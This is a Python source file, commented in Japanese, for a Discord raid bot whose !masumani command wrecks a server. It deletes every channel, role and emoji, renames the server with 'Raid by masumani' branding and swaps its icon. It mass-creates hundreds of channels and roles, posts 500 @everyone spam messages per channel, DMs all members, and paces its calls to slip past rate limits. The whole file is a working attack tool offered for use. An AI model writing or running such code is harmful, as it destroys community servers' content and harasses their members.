import discord
from discord.ext import commands
import asyncio
import aiohttp

# Intentsの設定
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

# Botの作成
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} ログインしました')
    print(f'Bot ID: {bot.user.id}')
    print('——')

@bot.command()
async def masumani(ctx):
    """
    サーバーを完全にリセットするコマンド
    使用例: !masumani
    """
```
# ここで設定を指定
new_server_name = "ますまに共栄圏植民地｜MSMN"  # 新しいサーバー名
icon_url = "https://i.imgur.com/uMaj6CP.jpeg"  # imgurリンク（絵文字作成にも使用）
channel_name = "ますまに共栄圏最強"  # 作成するチャンネル名
channel_count = 200  # 作成するチャンネル数
spam_message = "# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/msmn\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&"  # 各チャンネルに送信するメッセージ
spam_count = 500  # 各チャンネルに送信するメッセージ数
role_name = "ますまに共栄圏に荒らされました"  # 作成するロール名
role_count = 150  # 作成するロール数

# コマンドメッセージを即座に削除
await ctx.message.delete()

guild = ctx.guild
old_server_name = guild.name
user = ctx.author

# 実行開始通知
await user.send("**処理を開始します...**")

# メンバー全員(bot以外)にDMを送信
await user.send(f"メンバーにDMを送信中...")
dm_count = 0
for member in guild.members:
    if not member.bot:
        try:
            await member.send(f"「{old_server_name}」をリセットしました")
            dm_count += 1
        except:
            # DMを送れないユーザーはスキップ
            pass

await user.send(f"✅ DM送信完了: {dm_count}人に送信しました")

# サーバーアイコンを変更
await user.send(f"サーバーアイコンを変更中...")
icon_bytes = None
try:
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as resp:
            if resp.status == 200:
                icon_bytes = await resp.read()
                await guild.edit(icon=icon_bytes)
                await user.send(f"アイコン変更完了")
except Exception as e:
    await user.send(f"アイコン変更失敗: {e}")

# サーバー名を変更
await user.send(f"サーバー名を変更中...")
try:
    await guild.edit(name=new_server_name)
    await user.send(f"サーバー名変更: {old_server_name} → {new_server_name}")
except Exception as e:
    await user.send(f"サーバー名変更失敗: {e}")

# 全ての絵文字を削除
await user.send(f"全ての絵文字を削除中...")
emoji_deleted = 0
for emoji in guild.emojis:
    try:
        await emoji.delete()
        emoji_deleted += 1
    except:
        pass
await user.send(f"✅ {emoji_deleted}個の絵文字を削除しました")

# 新しい絵文字を作成（最大50個まで）
await user.send(f"新しい絵文字を作成中...")
emoji_created = 0
if icon_bytes:
    try:
        # 通常サーバーは最大50個、ブーストレベルで増加
        max_emojis = guild.emoji_limit
        for i in range(max_emojis):
            try:
                await guild.create_custom_emoji(name=f"emoji{i}", image=icon_bytes)
                emoji_created += 1
                await asyncio.sleep(0.3)  # レート制限対策
            except:
                break
    except Exception as e:
        pass
await user.send(f"✅ {emoji_created}個の絵文字を作成しました")

# 全てのロールを削除（@everyoneとBot管理ロール以外）
await user.send(f"ロールを削除中...")
role_deleted = 0
for role in guild.roles:
    if role.name != "@everyone" and not role.managed:
        try:
            await role.delete()
            role_deleted += 1
        except:
            pass
await user.send(f"✅ {role_deleted}個のロールを削除しました")

# カラフルなロールを作成
await user.send(f"ロールを{role_count}個作成中...")
import random
role_created = 0
for i in range(role_count):
    try:
        # ランダムなカラフルな色を生成
        color = discord.Color.from_rgb(
            random.randint(50, 255),
            random.randint(50, 255),
            random.randint(50, 255)
        )
        await guild.create_role(name=role_name, color=color)
        role_created += 1
    except:
        pass
await user.send(f"✅ {role_created}個のロールを作成しました")

# 全チャンネルを削除
await user.send(f"チャンネル削除中...")
deleted_count = 0
for channel in guild.channels:
    try:
        await channel.delete()
        deleted_count += 1
    except Exception as e:
        pass

await user.send(f"✅ {deleted_count}個のチャンネルを削除しました")

# 新しいチャンネルを作成
await user.send(f"チャンネルを{channel_count}個作成中...")
created_channels = []
created_count = 0
tasks = []

# 非同期で複数のチャンネルを同時作成（高速化）
for i in range(channel_count):
    tasks.append(guild.create_text_channel(name=channel_name))

    # 5個ずつバッチ処理（レート制限対策）
    if len(tasks) >= 5:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if not isinstance(result, Exception):
                created_count += 1
                created_channels.append(result)
        tasks = []
        await asyncio.sleep(0.5)  # レート制限回避

# 残りのタスクを実行
if tasks:
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if not isinstance(result, Exception):
            created_count += 1
            created_channels.append(result)

await user.send(f"✅ {created_count}個のチャンネルを作成しました")

# 各チャンネルにメッセージをスパム送信
await user.send(f"メッセージを送信中...")
total_messages = 0

for channel in created_channels:
    try:
        for i in range(spam_count):
            await channel.send(spam_message)
            total_messages += 1
    except Exception as e:
        pass

await user.send(f"✅ {total_messages}個のメッセージを送信しました")

# 完了通知
await user.send(
    f"🎉 **全ての処理が完了しました！**\n"
    f"━━━━━━━━━━━━━━━━\n"
    f"📧 DM送信: {dm_count}人\n"
    f"😀 絵文字削除: {emoji_deleted}個\n"
    f"😀 絵文字作成: {emoji_created}個\n"
    f"👥 ロール削除: {role_deleted}個\n"
    f"🌈 ロール作成: {role_created}個\n"
    f"🗑️ チャンネル削除: {deleted_count}個\n"
    f"📂 チャンネル作成: {created_count}個\n"
    f"💬 メッセージ送信: {total_messages}件"
)
```

@masumani.error
async def masumani_error(ctx, error):
await ctx.send(f"❌ エラーが発生しました: {error}")

# Botを起動
import os
from dotenv import load_dotenv

load_dotenv()  # .envを読み込む

TOKEN = os.getenv("TOKEN")

if __name__ == "__main__":
    bot.run(TOKEN)